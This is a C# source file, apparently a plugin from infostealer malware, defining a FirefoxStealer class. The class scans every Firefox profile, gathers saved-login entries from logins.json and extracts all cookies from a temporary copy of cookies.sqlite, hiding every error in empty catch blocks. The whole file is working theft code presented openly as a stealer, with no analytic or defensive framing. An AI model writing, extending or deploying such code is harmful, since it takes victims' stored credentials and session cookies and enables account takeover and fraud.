using System;
using System.Collections.Generic;
using System.IO;
using System.Text;
using Newtonsoft.Json.Linq;
using CS_SQLite3;

namespace Plugin.Browsers
{
    public class FirefoxStealer : BrowserBase
    {
        private string firefoxPath;
        
        public FirefoxStealer()
        {
            browserName = "Firefox";
            string appData = Environment.GetEnvironmentVariable("APPDATA");
            firefoxPath = Path.Combine(appData, "Mozilla", "Firefox", "Profiles");
            profilePath = firefoxPath;
        }
        
        public override List<SavedLogin> GetPasswords()
        {
            List<SavedLogin> logins = new List<SavedLogin>();
            
            if (!CheckBrowserInstalled())
                return logins;
            
            try
            {
                string[] profiles = Directory.GetDirectories(firefoxPath);
                
                foreach (string profile in profiles)
                {
                    string loginsFile = Path.Combine(profile, "logins.json");
                    string key4File = Path.Combine(profile, "key4.db");
                    
                    if (File.Exists(loginsFile))
                    {
                        logins.AddRange(ExtractLoginsFromJson(loginsFile));
                    }
                }
            }
            catch { }
            
            return logins;
        }
        
        private List<SavedLogin> ExtractLoginsFromJson(string loginsFile)
        {
            List<SavedLogin> logins = new List<SavedLogin>();
            
            try
            {
                string json = File.ReadAllText(loginsFile);
                JObject data = JObject.Parse(json);
                JArray loginArray = (JArray)data["logins"];
                
                foreach (JToken login in loginArray)
                {
                    try
                    {
                        string hostname = login["hostname"]?.ToString();
                        string username = login["encryptedUsername"]?.ToString();
                        string password = login["encryptedPassword"]?.ToString();
                        
                        // Note: Firefox passwords are encrypted with master key
                        // Full decryption requires NSS library (complex)
                        // For now, store encrypted values
                        
                        SavedLogin savedLogin = new SavedLogin
                        {
                            Url = hostname ?? "",
                            Username = "[Encrypted: " + (username ?? "") + "]",
                            Password = "[Encrypted: " + (password ?? "") + "]",
                            Browser = browserName
                        };
                        
                        logins.Add(savedLogin);
                    }
                    catch { }
                }
            }
            catch { }
            
            return logins;
        }
        
        public override List<Cookie> GetCookies()
        {
            List<Cookie> cookies = new List<Cookie>();
            
            if (!CheckBrowserInstalled())
                return cookies;
            
            try
            {
                string[] profiles = Directory.GetDirectories(firefoxPath);
                
                foreach (string profile in profiles)
                {
                    string cookiesDb = Path.Combine(profile, "cookies.sqlite");
                    
                    if (File.Exists(cookiesDb))
                    {
                        string tempDb = GetTempCopyPath(cookiesDb);
                        if (tempDb != null)
                        {
                            cookies.AddRange(ExtractCookiesFromDb(tempDb));
                            CleanupTempFile(tempDb);
                        }
                    }
                }
            }
            catch { }
            
            return cookies;
        }
        
        private List<Cookie> ExtractCookiesFromDb(string dbPath)
        {
            List<Cookie> cookies = new List<Cookie>();
            
            try
            {
                SQLiteDatabase db = new SQLiteDatabase(dbPath);
                string query = "SELECT host, name, value, path, expiry, isSecure FROM moz_cookies";
                DataTable results = db.ExecuteQuery(query);
                
                foreach (DataRow row in results.Rows)
                {
                    try
                    {
                        Cookie cookie = new Cookie
                        {
                            HostKey = row["host"].ToString(),
                            Name = row["name"].ToString(),
                            Value = row["value"].ToString(),
                            Path = row["path"].ToString(),
                            ExpiresUtc = Convert.ToInt64(row["expiry"]),
                            Secure = Convert.ToInt32(row["isSecure"]) == 1
                        };
                        
                        cookies.Add(cookie);
                    }
                    catch { }
                }
            }
            catch { }
            
            return cookies;
        }
    }
}
